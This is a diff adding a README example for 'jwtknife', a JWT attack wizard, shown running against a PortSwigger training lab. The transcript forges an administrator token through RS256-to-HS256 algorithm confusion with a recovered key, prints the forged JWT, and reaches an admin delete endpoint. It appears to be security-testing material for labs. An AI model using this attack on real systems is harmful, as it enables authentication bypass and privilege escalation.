@@ -25,3 +25,49 @@ You will be prompted to:
 - Choose where the JWT is sent
 - Define baseline endpoints
 - Select which tests to run
+
+Example Use (Port Swigger Lab: JWT authentication bypass via algorithm confusion with no exposed key)
+% ./jwtknife
+jwtknife – JWT auth testing wizard
+
+How do you want to provide the JWT?
+  1) Paste JWT into terminal
+  2) Read JWT from file
+Choose [1-2]: 1
+Paste the JWT (you can include 'Bearer '): eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.<payload>.<signature>
+
+Do you have a second JWT issued by the server? (used for alg confusion with no exposed key)
+Provide second JWT? [y/N]: y
+How do you want to provide the second JWT?
+  1) Paste JWT into terminal
+  2) Read JWT from file
+Choose [1-2]: 1
+Paste the second JWT (you can include 'Bearer '): eyJraWQiOiIyM2U0YWY1NC0zYjkwLTRkYzYtOWU5.<payload>.<signature>
+
+Decoded JWT:
+  alg: RS256
+  kid: 23e4af54-3b90-4dc6-9e9c-62848ddadf63
+
+Where is the JWT sent?
+  1) Authorization: Bearer <token>
+  2) Cookie
+  3) Custom header
+Choose [1-3]: 2
+Cookie name: session
+Unauthenticated URL (accessible without any JWT): https://<lab-id>.web-security-academy.net              
+Authenticated URL (accessible with the provided JWT): https://<lab-id>.web-security-academy.net
+Privilege-escalation target URL (admin or higher-privilege endpoint): https://<lab-id>.web-security-academy.netdelete?username=carlos
+
+Phase 1: JWT auth attacks
+
+✅ SUCCESS
+Attack: alg-confusion-sig2n
+Note: admin access via algorithm confusion with recovered RSA key (sig2n)
+
+Forged JWT:
+eyJhbGciOiJIUzI1NiIsImtpZCI6IjIzZTRhZjU0LTNiOTAtNGRjNi05ZTljLTYyODQ4ZGRhZGY2MyJ9.eyJleHAiOjE3NzA3MTMwNzcsImlzcyI6InBvcnRzd2lnZ2VyIiwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.DevsHujxCgXJc9mWGDtyAgfUdtAP89_VIDA229TtzWo
+
+HTTP request / response for successful step:
+{Status:302 BodyLen:0 Duration:1.29833325s Err:}
+
+
